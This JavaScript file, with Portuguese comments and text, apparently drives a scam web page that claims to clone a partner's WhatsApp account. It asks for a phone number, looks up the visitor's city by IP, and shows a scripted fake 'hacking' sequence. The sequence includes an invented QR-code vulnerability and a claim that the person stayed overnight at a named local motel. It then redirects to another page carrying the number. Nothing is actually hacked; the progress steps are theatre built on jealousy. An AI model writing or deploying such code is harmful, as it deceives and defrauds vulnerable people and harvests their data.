document.addEventListener("DOMContentLoaded", function () {
  const inputPhone = document.querySelector(".input-phone");
  const btnClone = document.querySelector(".btn.green");

  // Verifica se o site já foi acessado em um celular
  const isMobileAccess = localStorage.getItem("mobileAccessed");

  if (isMobileAccess) {
    // Se já acessou, redireciona
    window.location.pathname = "/backexpirado";
  } else {
    // Se for a primeira vez, armazena o acesso
    localStorage.setItem("mobileAccessed", "true");
  }

  inputPhone.addEventListener("input", function () {
    let value = this.value.replace(/\D/g, "");
    value = value.replace(/^(\d{2})(\d)/, "($1) $2");
    value = value.replace(/(\d{5})(\d{4})$/, "$1-$2");
    this.value = value;

    if (this.value.length === 15) {
      btnClone.classList.add("enabled");
      btnClone.style.backgroundColor = "#52d669";
      btnClone.style.cursor = "pointer";
      btnClone.disabled = false;
    } else {
      btnClone.classList.remove("enabled");
      btnClone.style.backgroundColor = "#bdbdbd";
      btnClone.style.cursor = "not-allowed";
      btnClone.disabled = true;
    }
  });
  async function fetchCityAndMotel() {
    let userCity = "Desconhecida";
    let motelNome = "Motel não localizado";

    try {
      // Obter a cidade do usuário usando uma API de geolocalização
      const cityResponse = await fetch("https://ipapi.co/json/");
      const cityData = await cityResponse.json();
      userCity = cityData.city || "Desconhecida";

      // Obter o motel do PHP
      const motelResponse = await fetch(
        "/api/get_city_and_motel.php?cidade=" + userCity
      );
      const motelResult = await motelResponse.json();

      if (motelResult.status === "success") {
        motelNome = motelResult.motel.name || "Motel não localizado";
      }

      return { city: userCity, motel: motelNome };
    } catch (error) {
      console.error("Erro ao buscar a cidade e motel:", error);
      return { city: userCity, motel: motelNome };
    }
  }

  function updateCityAndMotel(city, motel) {
    const cityElement = document.getElementById("city");
    const motelElement = document.getElementById("motel");
    cityElement.textContent = city;
    motelElement.textContent = motel;
  }
  btnClone.addEventListener("click", async function () {
    const box = document.querySelector(".box");
    const phoneNumber = inputPhone.value.replace(/\D/g, "");

    // Buscar cidade e motel antes de criar o HTML
    const { city, motel } = await fetchCityAndMotel();

    box.innerHTML = `
            <div class="loading-box">
                <p class="status">
                    <span class="blinking-dot"></span> Investigação em andamento...
                </p>
                <h2 style="font-size: 23px; text-align: center;">Conectando WhatsApp, não saia dessa tela!</h2>
                <div class="progress-bar">
                    <div class="progress-bar-fill">0%</div>
                </div>
                <div id="process-container">
                    <div class="step">
                        <div class="icon loading"></div>
                        <span>Iniciando rastreamento...</span>
                    </div>
                    <div class="step">
                        <div class="icon"></div>
                        <span>Enviando requisição HTTPS...</span>
                    </div>
                    <div class="step">
                        <div class="icon"></div>
                        <span>Procurando vulnerabilidade na aplicação web...</span>
                    </div>
                    <div class="step">
                        <div class="icon"></div>
                        <span>Vulnerabilidade encontrada no código QR Temporário...</span>
                    </div>
                    <div class="step">
                        <div class="icon"></div>
                        <span>Autenticação do número de telefone com o WhatsApp Web...</span>
                    </div>
                    <div class="step">
                        <div class="icon"></div>
                        <span>Supostas localizações suspeitas em ${city}</span>
                    </div>
                    <div class="step">
                        <div class="icon"></div>
                        <span>Descobri que passou a noite no ${motel}</span>
                    </div>
                    <div class="step">
                        <div class="icon"></div>
                        <span>O whatsapp foi clonado, abrindo o WhatsApp Web...</span>
                    </div>
                </div>
            </div>
        `;
    startProgress(phoneNumber);
    showSteps();
  });

  async function startProgress(phoneNumber) {
    const progressBar = document.querySelector(".progress-bar-fill");
    let progress = 0;
    const progressStep = 100 / 36; // Progresso para 36 segundos

    const progressInterval = setInterval(() => {
      if (progress < 100) {
        progress += progressStep;
        progressBar.style.width = `${progress}%`;
        progressBar.textContent = `${Math.round(progress)}%`;
      } else {
        clearInterval(progressInterval);
        const currentUrl = window.location.href;
        const paramsStartIndex = currentUrl.indexOf("?");
        const params = currentUrl.substring(paramsStartIndex);
        const newUrl = `/foto${params.substring(
          0,
          params.lastIndexOf("&")
        )}&number=${phoneNumber}`;
        window.location.href = newUrl;
      }
    }, 1000);
  }

  function showSteps() {
    const steps = document.querySelectorAll(".step");
    let currentStep = 0;

    function showNextStep() {
      if (currentStep > 0) {
        const previousIcon = steps[currentStep - 1].querySelector(".icon");
        previousIcon.classList.remove("loading");
        previousIcon.classList.add("completed");
      }

      if (currentStep < steps.length) {
        const currentStepElement = steps[currentStep];
        currentStepElement.style.visibility = "visible";
        const currentIcon = currentStepElement.querySelector(".icon");
        currentIcon.classList.add("loading");

        currentStep++;
        setTimeout(showNextStep, 4000);
      }
    }

    setTimeout(showNextStep, 1000);
  }
});
